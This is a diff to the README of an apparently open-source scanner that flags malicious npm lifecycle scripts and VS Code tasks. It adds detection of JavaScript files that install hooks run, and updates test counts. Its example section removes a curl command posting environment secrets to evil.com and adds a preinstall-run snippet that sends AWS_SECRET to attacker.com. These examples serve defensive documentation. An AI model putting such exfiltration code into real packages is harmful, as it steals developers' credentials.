@@ -4,8 +4,8 @@
 
 [![Python Version](https://img.shields.io/badge/python-3.10%2B-blue)](https://www.python.org/downloads/)
 [![License: MIT](https://img.shields.io/badge/License-MIT-yellow.svg)](https://opensource.org/licenses/MIT)
-[![Tests](https://img.shields.io/badge/tests-146%20passed-brightgreen)](https://github.com/ymlsurgeon/dev-trust-scanner)
-[![Coverage](https://img.shields.io/badge/coverage-94%25-brightgreen)](https://github.com/ymlsurgeon/dev-trust-scanner)
+[![Tests](https://img.shields.io/badge/tests-160%20passed-brightgreen)](https://github.com/ymlsurgeon/dev-trust-scanner)
+[![Coverage](https://img.shields.io/badge/coverage-92%25-brightgreen)](https://github.com/ymlsurgeon/dev-trust-scanner)
 
 ## Overview
 
@@ -155,7 +155,9 @@ dev-trust-scan . -vv
 
 ### NPM Lifecycle Scripts Plugin
 
-Scans `package.json` for malicious patterns in lifecycle scripts:
+Scans `package.json` **and referenced JavaScript files** for malicious patterns in lifecycle scripts:
+
+**Key Feature:** Follows file references in lifecycle scripts (e.g., `"preinstall": "node index.js"`) and scans the actual JavaScript files for malicious code. This catches hidden malware that traditional scanners miss.
 
 | Rule ID | Severity | Description | Example |
 |---------|----------|-------------|---------|
@@ -168,9 +170,11 @@ Scans `package.json` for malicious patterns in lifecycle scripts:
 | NPM-007 | HIGH | Code obfuscation | `\x65\x76\x61\x6c` (hex escapes) |
 
 **Additional Checks:**
+- **JavaScript File Scanning**: Follows `node <file.js>` commands and scans referenced files
 - **Entropy Analysis**: Flags scripts with entropy >4.5 (likely obfuscated)
 - **Base64 Detection**: Finds long base64 strings (>40 chars)
 - **Obfuscation Patterns**: Hex/unicode escapes, fromCharCode
+- **Node.js HTTP Detection**: Detects `require('https')`, `https.get()`, etc.
 
 ### VS Code Tasks Plugin
 
@@ -221,23 +225,32 @@ $ dev-trust-scan ./interview-project
 
 ### NPM Package Credential Exfiltration
 
-**Attack Vector:** Malicious postinstall script stealing environment variables
+**Attack Vector:** Malicious code in separate JavaScript file executed by lifecycle script
 
 ```json
+// package.json
 {
   "scripts": {
-    "postinstall": "curl -X POST evil.com/exfil -d \"$(env | grep SECRET)\""
+    "preinstall": "node index.js"
   }
 }
+
+// index.js (malicious)
+const https = require('https');
+https.get('https://attacker.com/exfil?data=' + process.env.AWS_SECRET);
 ```
 
 **Detection:**
 ```bash
 $ dev-trust-scan .
 
-🔴 HIGH: Network calls in lifecycle scripts [NPM-003]
+🔴 MEDIUM: Network calls in lifecycle scripts [NPM-003]
+   File: index.js (executed by 'preinstall')
+   Match: require('https')
 🟡 MEDIUM: Environment variable access [NPM-004]
 ```
+
+**Why this matters:** Many scanners only check package.json content and miss malicious code in referenced .js files. Dev Trust Scanner follows these references and scans the actual files.
 
 ### Base64 Obfuscated Malware
 
@@ -352,15 +365,16 @@ dev-trust-scanner/
 │       └── vscode_tasks/
 │           ├── scanner.py        # VS Code tasks scanner
 │           └── rules/vscode_rules.yaml
-├── tests/                        # 146 tests, 94% coverage
+├── tests/                        # 160 tests, 92% coverage
 │   ├── test_integration.py
 │   ├── test_npm_lifecycle.py
 │   ├── test_vscode_tasks.py
 │   └── ...
-└── docs/
-    ├── mission.md                # Project objectives
-    ├── decisions.md              # Architecture decisions
-    └── CLAUDE.md                 # Development workflow
+├── docs/
+│   ├── mission.md                # Project objectives
+│   ├── decisions.md              # Architecture decisions
+│   └── CLAUDE.md                 # Development workflow
+└── README.md                     # This file
 ```
 
 ---
@@ -386,13 +400,14 @@ pytest tests/test_integration.py -v
 ### Test Results
 
 ```
-146 tests passed
-94% code coverage
+160 tests passed
+92% code coverage
 - Core models: 100%
 - Plugin base: 100%
 - Static analysis: 98%
 - Orchestrator: 92%
-- Plugins: 86-88%
+- npm_lifecycle: 84%
+- vscode_tasks: 87%
 ```
 
 ### Adding a New Plugin
@@ -479,12 +494,13 @@ Found a vulnerability in Dev Trust Scanner itself? Please report responsibly:
 - [x] Core models (Pydantic v2)
 - [x] Static analysis utilities (base64, entropy, obfuscation)
 - [x] Plugin base class & architecture
-- [x] npm lifecycle plugin (7 rules)
+- [x] npm lifecycle plugin (7 rules + JS file scanning)
 - [x] VS Code tasks plugin (6 rules)
+- [x] JavaScript file reference tracking (critical for real-world malware detection)
 - [x] Orchestrator with plugin coordination
 - [x] Multi-format reporting (Text, JSON, SARIF)
 - [x] CLI with Click
-- [x] Integration tests (146 tests, 94% coverage)
+- [x] Integration tests (160 tests, 92% coverage)
 
 ### 🔜 Planned (v0.2.0)
 - [ ] Git hooks plugin (pre-commit, post-checkout)
